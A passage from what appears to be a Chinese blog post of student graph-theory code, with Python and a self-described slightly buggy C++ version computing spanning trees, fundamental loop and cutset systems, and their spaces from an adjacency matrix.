class="built_in">range</span>(<span class="built_in">len</span>(inc))) - <span class="built_in">set</span>(side))</span><br><span class="line">    loop_point = []</span><br><span class="line">    <span class="comment"># 计算每条弦的回路中的点</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> chord:</span><br><span class="line">        e = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc[<span class="number">0</span>])) <span class="keyword">if</span> inc[each][i] == <span class="number">1</span>]</span><br><span class="line">        path = BFS_loop(adj_tree, e[<span class="number">0</span>], e[<span class="number">1</span>])</span><br><span class="line">        path.append(e[<span class="number">0</span>])</span><br><span class="line">        loop_point.append(path)</span><br><span class="line">    loop_side = []</span><br><span class="line">    <span class="comment"># 根据回路中的点求出对应的边</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> loop_point:</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">        x = []</span><br><span class="line">        <span class="keyword">while</span> index &lt; <span class="built_in">len</span>(each):</span><br><span class="line">            t = [<span class="number">0</span>] * <span class="built_in">len</span>(inc[<span class="number">0</span>])</span><br><span class="line">            t[each[index - <span class="number">1</span>]], t[each[index]] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc)):</span><br><span class="line">                <span class="keyword">if</span> inc[i] == t:</span><br><span class="line">                    x.append(<span class="string">&#x27;e&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        loop_side.append(x)</span><br><span class="line">    <span class="keyword">return</span> loop_side</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否连通</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Connected</span>(<span class="params">m: <span class="built_in">list</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    visited = [<span class="literal">False</span>] * <span class="built_in">len</span>(m)</span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">True</span></span><br><span class="line">    queue = [<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># BFS搜索</span></span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        now = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">            <span class="keyword">if</span> m[now][i] == <span class="number">1</span> <span class="keyword">and</span> visited[i] == <span class="literal">False</span>:</span><br><span class="line">                queue.append(i)</span><br><span class="line">                visited[i] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(visited)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本割集系统</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Basic_cutset_system</span>(<span class="params">adj_tree: <span class="built_in">list</span>, side: <span class="built_in">list</span>, inc: <span class="built_in">list</span></span>):</span><br><span class="line">    chord = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(inc))) - <span class="built_in">set</span>(side))</span><br><span class="line">    cutset_side = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(side)):</span><br><span class="line">        adj_tree_copy = copy.deepcopy(adj_tree)</span><br><span class="line">        <span class="comment"># 删除树枝</span></span><br><span class="line">        e = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc[<span class="number">0</span>])) <span class="keyword">if</span> inc[side[i]][_] == <span class="number">1</span>]</span><br><span class="line">        adj_tree_copy[e[<span class="number">0</span>]][e[<span class="number">1</span>]], adj_tree_copy[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        x = [<span class="string">&#x27;e&#x27;</span> + <span class="built_in">str</span>(side[i])]</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> chord:</span><br><span class="line">            <span class="comment"># 加上一条弦</span></span><br><span class="line">            e = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc[<span class="number">0</span>])) <span class="keyword">if</span> inc[each][_] == <span class="number">1</span>]</span><br><span class="line">            adj_tree_copy[e[<span class="number">0</span>]][e[<span class="number">1</span>]], adj_tree_copy[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> Connected(adj_tree_copy):</span><br><span class="line">                <span class="comment"># 如果连通则去除该弦，并加入割集</span></span><br><span class="line">                x.append(<span class="string">&#x27;e&#x27;</span> + <span class="built_in">str</span>(each))</span><br><span class="line">                e = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc[<span class="number">0</span>])) <span class="keyword">if</span> inc[each][_] == <span class="number">1</span>]</span><br><span class="line">                adj_tree_copy[e[<span class="number">0</span>]][e[<span class="number">1</span>]], adj_tree_copy[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        cutset_side.append(x)</span><br><span class="line">    <span class="keyword">return</span> cutset_side</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 环路空间和断集空间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space</span>(<span class="params">side: <span class="built_in">list</span></span>):</span><br><span class="line">    rep = copy.deepcopy(side)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(side) + <span class="number">1</span>):</span><br><span class="line">        x = itertools.combinations(<span class="built_in">range</span>(<span class="built_in">len</span>(side)), i)</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> x:</span><br><span class="line">            t = copy.deepcopy(side[e[<span class="number">0</span>]])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> e[<span class="number">1</span>:]:</span><br><span class="line">                <span class="keyword">for</span> each <span class="keyword">in</span> side[j]:</span><br><span class="line">                    <span class="keyword">if</span> each <span class="keyword">in</span> t:</span><br><span class="line">                        t.remove(each)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        t.append(each)</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> rep:</span><br><span class="line">                rep.append(t)</span><br><span class="line">    <span class="keyword">return</span> rep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#主函数</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入相邻矩阵：（输入‘0’退出）&quot;</span>)</span><br><span class="line">    adj = []</span><br><span class="line">    cin = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cin == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> cin:</span><br><span class="line">        adj.append(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, cin.split())))</span><br><span class="line">        cin = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    inc = Incidence_matrix(adj)</span><br><span class="line">    adj_tree, inc_tree, side = tree(inc)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成树的关联矩阵：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> side:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;e&#x27;</span> + <span class="built_in">str</span>(i), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc_tree[<span class="number">0</span>])):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;v&quot;</span> + <span class="built_in">str</span>(i), end=<span class="string">&quot;  &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inc_tree)):</span><br><span class="line">            <span class="built_in">print</span>(inc_tree[j][i], end=<span class="string">&quot;  &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    tree_num = tree_number(adj)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n有 <span class="subst">&#123;tree_num&#125;</span> 种实现方案\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    loop_side = Basic_loop_system(adj_tree, inc, side)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;基本回路系统：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(loop_side)):</span><br><span class="line">        <span class="keyword">if</span> i != <span class="built_in">len</span>(loop_side) - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(loop_side[i]), end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(loop_side[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    beltway = space(loop_side)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;环路空间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123; Φ, &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(beltway)):</span><br><span class="line">        <span class="keyword">if</span> i != <span class="built_in">len</span>(beltway) - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(beltway[i]), end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(beltway[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    cutset_side = Basic_cutset_system(adj_tree, side, inc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;基本割集系统：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cutset_side)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> i != <span class="built_in">len</span>(cutset_side) - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(cutset_side[i]), end=<span class="string">&quot; &#125;, &quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(cutset_side[i]), end=<span class="string">&quot; &#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; &#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    breakset = space(cutset_side)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;断集空间：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123; Φ, &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(breakset)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> i != <span class="built_in">len</span>(breakset) - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(breakset[i]), end=<span class="string">&quot; &#125;, &quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(breakset[i]), end=<span class="string">&quot; &#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; &#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">测试数据：</span></span><br><span class="line"><span class="string">0 1 1 1</span></span><br><span class="line"><span class="string">1 0 0 1</span></span><br><span class="line"><span class="string">1 0 0 1</span></span><br><span class="line"><span class="string">1 1 1 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 1 1 0 1</span></span><br><span class="line"><span class="string">1 0 1 0 1</span></span><br><span class="line"><span class="string">1 1 0 1 0</span></span><br><span class="line"><span class="string">0 0 1 0 1</span></span><br><span class="line"><span class="string">1 1 0 1 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 2 1 0</span></span><br><span class="line"><span class="string">2 0 1 1</span></span><br><span class="line"><span class="string">1 1 0 0</span></span><br><span class="line"><span class="string">0 1 0 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">教师测试数据：</span></span><br><span class="line"><span class="string">0 1 1 0 1</span></span><br><span class="line"><span class="string">1 0 1 0 1</span></span><br><span class="line"><span class="string">1 1 0 1 0</span></span><br><span class="line"><span class="string">0 0 1 0 1</span></span><br><span class="line"><span class="string">1 1 0 1 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 1 1 0 0 0</span></span><br><span class="line"><span class="string">1 0 1 0 0 0</span></span><br><span class="line"><span class="string">1 1 0 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 0 1 1</span></span><br><span class="line"><span class="string">0 0 0 1 0 1</span></span><br><span class="line"><span class="string">0 0 0 1 1 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="C-（有点bug）"><a href="#C-（有点bug）" class="headerlink" title="C++:（有点bug）"></a>C++:（有点bug）</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vector&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cmath&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;queue&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;algorithm&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">guanlianMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; l) &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; l.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; l.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l[i][j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; l[i][j]; k++) &#123;</span><br><span class="line">                    vector&lt;<span class="type">int</span>&gt; line;</span><br><span class="line">                    line.<span class="built_in">assign</span>(l.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">                    line[i] = <span class="number">1</span>;</span><br><span class="line">                    line[j] = <span class="number">1</span>;</span><br><span class="line">                    t.<span class="built_in">push_back</span>(line);</span><br><span class="line">                    l[i][j]--;</span><br><span class="line">                    l[j][i]--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得det[i][j]余子式行列式</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; <span class="built_in">complementMinor</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; det, <span class="type">int</span> i, <span class="type">int</span> j) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = det.<span class="built_in">size</span>();<span class="comment">//n为det的行，m为det的列；</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ans</span>(n - <span class="number">1</span>);<span class="comment">//保存获得的结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n - <span class="number">1</span>; k++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; n - <span class="number">1</span>; l++) &#123;</span><br><span class="line">            ans[k].<span class="built_in">push_back</span>(det[k &lt; i ? k : k + <span class="number">1</span>][l &lt; j ? l : l + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Det</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; det)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = det.<span class="built_in">size</span>(), m = det[<span class="number">0</span>].<span class="built_in">size</span>();<span class="comment">//n为det的行，m为det的列；</span></span><br><span class="line">    <span class="keyword">if</span> (n != m) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (det.<span class="built_in">size</span>() == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> det[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        ans += det[<span class="number">0</span>][i] * <span class="built_in">pow</span>(<span class="number">-1</span>, i) * <span class="built_in">Det</span>(<span class="built_in">complementMinor</span>(det, <span class="number">0</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">treeNum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; l)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; l.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; t;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; l.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j) &#123;</span><br><span class="line">                <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k: l[j]) &#123;</span><br><span class="line">                    sum += k;</span><br><span class="line">                &#125;</span><br><span class="line">                t.<span class="built_in">push_back</span>(sum);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                t.<span class="built_in">push_back</span>(-l[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Det</span>(m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">tree</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; l, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;xianglin, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;guanlian, vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; &amp;bian)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">1</span> &lt;&lt; l.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        bian.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> x = i, place = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x &amp; <span class="number">0x1</span>) &#123;</span><br><span class="line">                bian.<span class="built_in">push_back</span>(place);</span><br><span class="line">                n++;</span><br><span class="line">            &#125;</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            place++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == l[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 去除第一行判断矩阵是否满秩</span></span><br><span class="line">            vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; matrix;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> j: bian) &#123;</span><br><span class="line">                vector&lt;<span class="type">int</span>&gt; t;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; l[j].<span class="built_in">size</span>(); k++) &#123;</span><br><span class="line">                    t.<span class="built_in">push_back</span>(l[j][k]);</span><br><span class="line">                &#125;</span><br><span class="line">                matrix.<span class="built_in">push_back</span>(t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">Det</span>(matrix) != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算关联矩阵</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: bian) &#123;</span><br><span class="line">        guanlian.<span class="built_in">push_back</span>(l[x]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; l[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; t;</span><br><span class="line">        t.<span class="built_in">assign</span>(l[<span class="number">0</span>].<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">        xianglin.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算相邻矩阵</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i: guanlian) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; e;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i[j] == <span class="number">1</span>) e.<span class="built_in">push_back</span>(j);</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="built_in">size</span>() == <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        xianglin[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">        xianglin[e[<span class="number">1</span>]][e[<span class="number">0</span>]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    Node *parent;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; <span class="title">bfs_loop</span><span class="params">(<span class="type">const</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;tree, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">bool</span>&gt; visited;</span><br><span class="line">    visited.<span class="built_in">assign</span>(tree.<span class="built_in">size</span>(), <span class="literal">false</span>);</span><br><span class="line">    visited[start] = <span class="literal">true</span>;</span><br><span class="line">    vector&lt;Node&gt; points;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; tree.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        Node t&#123;<span class="literal">nullptr</span>, i&#125;;</span><br><span class="line">        points.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(start);</span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; tree.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tree[now][i] == <span class="number">1</span> &amp;&amp; !visited[i]) &#123;</span><br><span class="line">                points[i].parent = &amp;points[now];</span><br><span class="line">                q.<span class="built_in">push</span>(i);</span><br><span class="line">                visited[i] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (now == end) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; road;</span><br><span class="line">    road.<span class="built_in">push_back</span>(end);</span><br><span class="line">    <span class="keyword">while</span> (points[end].parent) &#123;</span><br><span class="line">        end = points[end].parent-&gt;num;</span><br><span class="line">        road.<span class="built_in">insert</span>(road.<span class="built_in">begin</span>(), end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> road;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">loop</span>(<span class="type">const</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;xianglin, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; guanlian, vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; bian) &#123;</span><br><span class="line">    vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; xian;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">count</span>(bian.<span class="built_in">begin</span>(), bian.<span class="built_in">end</span>(), i)) &#123;</span><br><span class="line">            xian.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;&gt; points;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: xian) &#123;</span><br><span class="line">        vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; e;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; guanlian[<span class="number">0</span>].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (guanlian[x][i] == <span class="number">1</span>) &#123;</span><br><span class="line">                e.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; t = <span class="built_in">bfs_loop</span>(xianglin, e[<span class="number">0</span>], e[<span class="number">1</span>]);</span><br><span class="line">        t.<span class="built_in">push_back</span>(e[<span class="number">0</span>]);</span><br><span class="line">        points.<span class="built_in">push_back</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: points) &#123;</span><br><span 